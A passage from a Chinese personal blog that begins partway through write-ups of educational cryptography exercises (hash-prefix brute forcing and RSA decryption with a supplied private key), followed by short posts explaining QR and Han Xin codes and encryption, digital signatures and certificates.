class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(data).digest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_collision</span>(<span class="params">secret_hash_prefix</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 生成随机数据（也可以是序列数据，逐个尝试）</span></span><br><span class="line">        data = random.randbytes(<span class="number">16</span>)  <span class="comment"># 随机生成 16 字节数据</span></span><br><span class="line">        hash_value = sha256(data)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 比较前两个字节</span></span><br><span class="line">        <span class="keyword">if</span> hash_value[:<span class="number">2</span>] == secret_hash_prefix:</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设我们已经知道 secret_hash_prefix 是通过前面的代码获得的</span></span><br><span class="line">secret_hash_prefix = base64.b64decode(secret_sha)[:<span class="number">2</span>]<span class="comment">#sha256(b'secret_flag')[:2]  # 替换为真实的秘密哈希前缀</span></span><br><span class="line">collision_data = find_collision(secret_hash_prefix)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"找到的碰撞数据: <span class="subst">{collision_data}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(collision_data))</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level10：给定一个base64编码，要求你再添加一段base64编码在末尾使得完整的数据经过hash后，前两个字节是null</p>
<p>WP：null字节的十六进制为<code>\x00</code>，这题依旧是暴力求解，这里我先假设添加到末尾的数据是数字而不包含字母，没想到成功了</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Base64 decode the challenge data</span></span><br><span class="line">challenge_b64 = <span class="string">"cD4QncA+h/LdarOt1oxo3KZ4xGrN0aTFZ+SUbxNK9X4="</span></span><br><span class="line">challenge_data = base64.b64decode(challenge_b64)</span><br><span class="line"><span class="comment"># Step 2: Bruteforce to find the correct response data</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_response</span>(<span class="params">challenge_data</span>):</span><br><span class="line">    response = <span class="number">0</span>  <span class="comment"># Start from 0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># Convert the response data to bytes and append it to the challenge data</span></span><br><span class="line">        response_data = <span class="built_in">str</span>(response).encode() <span class="comment"># 将response_data转换为字符串方便编码</span></span><br><span class="line">        data = challenge_data + response_data</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Compute SHA256 hash of the concatenated data</span></span><br><span class="line">        hash_value = hashlib.sha256(data).digest()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Check if the first two bytes of the hash are null bytes (0x00 0x00)</span></span><br><span class="line">        <span class="keyword">if</span> hash_value[:<span class="number">2</span>] == <span class="string">b'\x00\x00'</span>:</span><br><span class="line">        	<span class="built_in">print</span>(hash_value)</span><br><span class="line">        	<span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">        response += <span class="number">1</span>  <span class="comment"># Increment response and try again</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Run the bruteforce function</span></span><br><span class="line">response_data = find_response(challenge_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"找到的 response data 是: <span class="subst">{response_data}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>得到明文，然后经过base64编码后输入终端得到flag</p></li>
<li><p>level11：通过RSA的公钥和私钥和密文求出明文</p>
<p>WP：查看源码，发现challenge是经过公钥加密过的密文</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">level11</span>():</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    In this challenge you will complete an RSA challenge-response.</span></span><br><span class="line"><span class="string">    You will be provided with both the public key and private key.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    key = RSA.generate(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line">    show_hex(<span class="string">"e"</span>, key.e)</span><br><span class="line">    show_hex(<span class="string">"d"</span>, key.d)</span><br><span class="line">    show_hex(<span class="string">"n"</span>, key.n)</span><br><span class="line"></span><br><span class="line">    challenge = <span class="built_in">int</span>.from_bytes(get_random_bytes(<span class="number">256</span>), <span class="string">"little"</span>) % key.n</span><br><span class="line">    show_hex(<span class="string">"challenge"</span>, challenge)</span><br><span class="line"></span><br><span class="line">    response = input_hex(<span class="string">"response"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(response, key.e, key.n) == challenge:</span><br><span class="line">        show(<span class="string">"flag"</span>, flag.decode())</span><br></pre></td></tr></tbody></table></figure>
<p>因此可以根据私钥逆向求出明文</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inverse</span>(<span class="params">a,m</span>):</span><br><span class="line">	<span class="keyword">if</span> math.gcd(a,m) != <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">raise</span> ValueError(<span class="string">"a和m必须互质"</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">pow</span>(a, -<span class="number">1</span>, m)  <span class="comment"># 计算模逆元</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">0xc177fb1ea71d946c909123a4ec45cd845d67bf5dd88730832cf5eabce7d5402bc3d4f95d5c7d7b198191b21d9dc138a293005ed68f955d608c95257557aa82ddc3477fb151acac90ff86cfcc9f9a0b197601457505ae9f25db50a62e26937319905e4a268dfdfbebf89ad07a59311eb00e791841f063165c2c107ffbec38f741b6a679ec96fe1f9a247b8428391e3ab5721750b1686e73d6d5835c52f9cfbb50853c2699741061a57b8a88bcdb20db9324386c8c97bbca564febdc353158eabab2334423733f38ef7dfe95edbb1bf195f0440edd81f87143c2f29be9431b0cc3012b7b8cbe7deff92abb858a8d4ec62fe056b2d1633aaf93622780610625a451</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = <span class="number">0x26a10bb97f99a6e0946efe64782ea9cde38e8b05b46dadd08b4220d80e1c24bf784f06694f45d8b5eb8a893b639bc870a19461db4a7902d77bca6ddbc3a0ce9773ddcb4fbee490e234bb18b39d2c7749e2a7775459c9978a4a038ce2cb1e06cdd467173c227ed375b6c2469d1f40f1052b269fa2ceda22054e610f04e09231400b0da57b4d6be1eda7bfd6b16329a53ac93be634b509b07eae1a732faf13873401ed400bad1a3b69dfc78854e8c930bfcf2c1199b30b56341be8a35aa5e5feab42711d102263cb9951e60f7b8b4b9559616ed88972c353e7dd7772cd6d66b52b94449c0471ad9f7444259dbaef117895e13870ccebff30cf29502482f2c422ff</span></span><br><span class="line">challenge = <span class="number">0x253f10636b285fd622841c813fdaf012cc23380388f78c6da0e1671d784046dc576c1efcfd60e9286e563fb54ea595a1e083fff430bf58fdaa428d01da75b4109f735cd21b88619bc4d4a79698e9c33599fd7968232b1c0e33f2b23a4800d78d265d7eccc19bc6835087942664d147474ff6b4a30766ba6ff2e122176a3ef866c60f94731f54d867f7ebff089d6517bfb96d9246569880a290f1da2567b4b5cc2c8f96785783f13b6b346b6f10e18aa2fe0d461d3bceb286014acb31bb6f698fc25e80b26cbfa48dd105f1632e6fc62ad255363b26c3c0a8dcd8cc6da27cc2b83ab75aaac9ae5d1189ae93547985af1e769f7f8dcfc7f77611f001e56720ca96</span></span><br><span class="line"></span><br><span class="line">response = <span class="built_in">pow</span>(challenge, d, n).to_bytes(<span class="number">256</span>, <span class="string">"big"</span>).<span class="built_in">hex</span>() <span class="comment">#这题与字节顺序无关</span></span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level12：</p></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/29/%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%92%8C%E6%B1%89%E4%BF%A1%E7%A0%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/08/29/%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%92%8C%E6%B1%89%E4%BF%A1%E7%A0%81/" class="post-title-link" itemprop="url">二维码和汉信码</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-08-29 09:22:33 / 修改时间：09:26:39" itemprop="dateCreated datePublished" datetime="2024-08-29T09:22:33+08:00">2024-08-29</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BC%96%E7%A0%81/" itemprop="url" rel="index"><span itemprop="name">编码</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>493</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="qr-code二维码">QR Code（二维码）</h3>
<ul>
<li><p>起源：QR码最早由日本公司Denso
Wave在1994年发明，用于追踪汽车零部件。</p></li>
<li><p>特点：</p>
<ul>
<li><strong>信息容量</strong>：QR码可以存储大量信息，包括文字、网址、甚至二进制数据。标准的QR码可以存储大约7,000个字符的数字数据或4,300个字母数字字符。</li>
<li><strong>纠错能力</strong>：QR码具有四级纠错能力，可以在部分破损的情况下仍然被解码。</li>
<li><strong>结构</strong>：QR码由黑白方格组成，形成一个方形矩阵，可以通过相机快速扫描识别。</li>
<li><strong>应用</strong>：广泛应用于商业、支付、广告、产品追踪等领域。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240829092401716.png" alt="image-20240829092401716" style="zoom: 33%;"></p></li>
</ul>
<h3 id="han-xin-code汉信码">Han Xin Code（汉信码）</h3>
<ul>
<li><p>起源：汉信码是由中国国家标准化管理委员会于2007年发布的一种二维条码，它特别适用于中文信息的编码和存储。</p></li>
<li><p>特点：</p>
<ul>
<li><strong>信息容量</strong>：汉信码特别设计用于存储汉字、日文假名、韩文、以及其他多种字符集。它可以容纳更多的汉字信息，比QR码更适合中文等东亚语言的编码。</li>
<li><strong>纠错能力</strong>：汉信码也具有纠错功能，具体的纠错能力取决于编码的级别和需求。</li>
<li><strong>结构</strong>：与QR码相似，汉信码也是一个二维的矩阵结构，不过它的结构更加灵活，以适应不同字符集的编码需求。</li>
<li><strong>应用</strong>：汉信码在中国的物流、零售、以及公共服务领域得到了应用，特别是需要处理大量中文信息的场景。</li>
</ul>
<p><img src="https://barcode.tec-it.com/barcode.ashx?data=%E6%B1%89%E4%BF%A1%E7%A0%81&amp;code=HanXin" style="zoom: 200%;"></p></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/06/%E5%8A%A0%E5%AF%86-%E7%AD%BE%E5%90%8D-%E8%AF%81%E4%B9%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/08/06/%E5%8A%A0%E5%AF%86-%E7%AD%BE%E5%90%8D-%E8%AF%81%E4%B9%A6/" class="post-title-link" itemprop="url">加密-数字签名-数字证书</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-08-06 20:24:23" itemprop="dateCreated datePublished" datetime="2024-08-06T20:24:23+08:00">2024-08-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-08-07 18:38:47" itemprop="dateModified" datetime="2024-08-07T18:38:47+08:00">2024-08-07</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="加密">加密</h2>
<p>可分为：</p>
<ul>
<li>对称加密</li>
<li>非对称加密</li>
</ul>
<h3 id="对称加密">对称加密</h3>
<p>同一个密钥可以同时用作信息的加密和解密。</p>
<p>常见的对称加密算法有：</p>
<ul>
<li><strong>AES</strong>：https://ctf-wiki.org/crypto/blockcipher/aes/</li>
<li>DES：分组加密算法，它将数据分成64位的块进行加密。</li>
<li>RC：RC算法家族包括RC2、RC4、RC5、RC6等</li>
</ul>
<h4 id="分组模式">分组模式</h4>
<p><strong>电子密码本模式（ECB - Electronic Codebook
Mode）</strong>：</p>
<ul>
<li>每个明文分组独立加密为相应的密文分组。</li>
<li>不推荐用于实际应用，因为相同的明文分组总是加密为相同的密文分组，导致模式泄露。</li>
</ul>
<p><strong>密码分组链接模式（CBC - Cipher Block Chaining
Mode）</strong>：</p>
<ul>
<li>每个明文分组在加密前与前一个密文分组进行异或操作。</li>
<li>需要一个初始向量（IV）来加密第一个分组。</li>
<li>增强了安全性，避免了相同的明文分组生成相同的密文分组。</li>
</ul>
<p><strong>计数器模式（CTR - Counter Mode）</strong>：</p>
<ul>
<li>将一个计数器值加密，然后将结果与明文分组进行异或操作。</li>
<li>计数器值每次加密时递增。</li>
<li>支持并行处理，提高加密速度。</li>
<li>也可用于流密码。</li>
</ul>
<p><strong>加密反馈模式（CFB - Cipher Feedback Mode）</strong>：</p>
<ul>
<li>类似于流密码，每个明文分组通过异或操作与加密的前一个密文分组进行加密。</li>
<li>需要一个初始向量（IV）。</li>
<li>适用于逐字节加密或逐位加密。</li>
</ul>
<p><strong>输出反馈模式（OFB - Output Feedback Mode）</strong>：</p>
<ul>
<li>类似于流密码，每个明文分组通过异或操作与一个加密的种子值进行加密，该种子值从初始向量（IV）开始，然后每次通过加密函数递归生成。</li>
<li>不同于CFB模式，OFB模式不依赖于前一个密文分组，因此加密过程可以提前进行。</li>
</ul>
<p><strong>Galois/Counter Mode（GCM）</strong>：</p>
<ul>
<li>结合了计数器模式和一个认证机制。</li>
<li>提供数据完整性和保密性。</li>
</ul>
<h4 id="缺点">缺点</h4>
<ul>
<li>在对称加密中，加密和解密使用相同的密钥。因此，如何安全地分发密钥是一个重大挑战。如果密钥在传输过程中被截获或泄露，整个加密系统的安全性将受到严重威胁。</li>
<li>对称加密无法提供非否认性，即无法证明一条消息确实是由某个特定用户发送的。因为加密和解密使用相同的密钥，任何拥有该密钥的人都可以加密和解密消息，因此无法区分消息的发送者。</li>
<li>对称加密需要一个安全的初始密钥交换机制。如果没有合适的密钥交换协议，初始密钥交换会成为系统的薄弱环节，容易受到攻击。</li>
</ul>
<h3 id="非对称加密">非对称加密</h3>
<p>使用一对密钥进行加密和解密操作。这对密钥包括一个公钥（Public
Key）和一个私钥（Private Key）。其中：</p>
<ul>
<li><p><strong>公钥</strong>：可以公开分发，用于<strong>加密</strong>数据。</p></li>
<li><p><strong>私钥</strong>：必须保密，用于<strong>解密</strong>数据。</p></li>
</ul>
<p>常见的非对称加密算法：</p>
<ul>
<li><strong>RSA</strong>：https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_theory/</li>
<li>ECC:基于椭圆曲线离散对数问题，提供相同安全级别所需的密钥长度比RSA短，因此效率更高</li>
<li>DSA：主要用于数字签名，基于离散对数问题。</li>
</ul>
<h4 id="问题">问题</h4>
<p>非对称加密能够一定程度上消除对称加密出现的安全问题，但是假如公钥被中间人拦截并篡改了呢？这就涉及到了数字签名和数字证书。</p>
<h2 id="数字签名">数字签名</h2>
<p><strong>数字签名</strong>是一种用于验证数字信息完整性、真实性和不可否认性的技术。它通过使用非对称加密算法，确保数据在传输过程中没有被篡改，<strong>并确认数据的发送者身份</strong>。数字签名是用<strong>私钥</strong>生成的</p>
<ol type="1">
<li><p><strong>生成哈希值</strong>：对要签名的数据进行哈希运算，生成固定长度的哈希值。</p></li>
<li><p><strong>加密哈希值</strong>：使用发送者的私钥对生成的哈希值进行加密，生成数字签名。</p></li>
<li><p><strong>附加签名</strong>：将数字签名附加到数据后面，一并发送给接收方。</p></li>
</ol>
<h2 id="数字证书">数字证书</h2>
<p><strong>数字证书</strong>是由权威机构（证书颁发机构，CA）签发的一种电子文档，用来<strong>验证公开密钥的真实性</strong>。它包含了公钥和持有者信息，并且由CA的<strong>私钥</strong>签名，确保证书的可信性。</p>
<ol type="1">
<li><p><strong>生成密钥对</strong>：申请者生成一对公钥和私钥，并向CA提交公钥和身份信息。</p></li>
<li><p><strong>CA验证信息</strong>：CA验证申请者的身份信息。</p></li>
<li><p><strong>签发证书</strong>：CA用其<strong>私钥</strong>对申请者的公钥和身份信息进行签名，生成数字证书，并将证书发给申请者。</p></li>
<li><p><strong>发布和使用</strong>：申请者将数字证书与公钥一起提供给需要验证其身份的各方。</p></li>
</ol>
<h2 id="示例">示例</h2>
<p>Alice 和 Bob 的安全通信：</p>
<ol type="1">
<li>Alice 申请数字证书
<ul>
<li>Alice 向证书颁发机构 (CA) 申请数字证书。</li>
<li>Alice 生成了一对公钥和私钥，并将公钥和个人身份信息发送给 CA。</li>
<li>CA 验证 Alice 的身份信息。</li>
<li>CA 用自己的私钥对 Alice 的公钥和身份信息进行签名，生成 Alice
的<strong>数字证书</strong>，并将证书发送给 Alice。</li>
</ul></li>
<li>Alice 发送带签名的消息给 Bob
<ul>
<li>Alice
使用她的私钥对消息进行签名，生成<strong>数字签名</strong>。</li>
<li>Alice 将消息和数字签名一起发送给 Bob，同时附上她的数字证书。</li>
</ul></li>
<li>Bob 验证 Alice 的数字签名和证书
<ul>
<li>Bob 收到消息、数字签名和 Alice 的数字证书。</li>
<li>Bob 使用 CA 的公钥验证 Alice 的数字证书，确认证书是由可信的 CA
签发的，并且证书中的公钥确实属于 Alice。</li>
<li>Bob 提取 Alice 的公钥，用它来验证 Alice
的数字签名，确保消息没有被篡改，并确认消息确实是由 Alice 发送的。</li>
</ul></li>
</ol>
<blockquote>
<p>在数字签名中，公钥和私钥是成对使用的。私钥用于加密（签名），公钥用于解密（验证）。虽然公钥通常用于解密加密的数据，但在数字签名的场景中，它的作用是验证签名是否有效。</p>
</blockquote>
<p>参考：https://segmentfault.com/a/1190000024523772</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="hxt"
      src="/images/hxt.jpg">
  <p class="site-author-name" itemprop="name">hxt</p>
  <div class="site-description" itemprop="description">May the Force be with you.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">177</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">69</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">hxt</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">407k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">6:10</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
